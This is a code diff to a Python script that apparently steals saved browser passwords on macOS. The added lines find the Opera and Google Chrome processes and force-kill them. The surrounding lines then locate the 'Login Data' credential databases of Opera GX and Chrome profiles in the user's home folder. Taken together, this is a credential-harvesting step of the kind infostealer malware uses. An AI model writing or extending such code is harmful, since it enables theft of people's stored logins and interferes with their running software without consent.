@@ -8,6 +8,30 @@ import hashlib
 import glob
 import time
 
+operapid = (
+    subprocess.check_output("ps -A | grep Opera | awk '{print $1}'", shell=True)
+    .replace(b"\n",b" ")
+    .replace(b"\"", b"")
+)
+
+operapid = operapid.decode('utf-8').split()
+
+chromepid = (
+    subprocess.check_output("ps -A | grep Google\ Chrome | awk '{print $1}'", shell=True)
+    .replace(b"\n",b" ")
+    .replace(b"\"", b"")
+)
+
+chromepid = chromepid.decode('utf-8').split()
+
+os.system(f"kill -9 {operapid[0]}")
+
+time.sleep(1)
+
+os.system(f"kill -9 {chromepid[0]}")
+
+time.sleep(1)
+
 OperaLoginData = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/com.operasoftware.OperaGX/Login Data")
 ChromeLoginData = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Google/Chrome/Profile*/Login Data")
 if len(ChromeLoginData) == 0 or len(OperaLoginData) == 0:
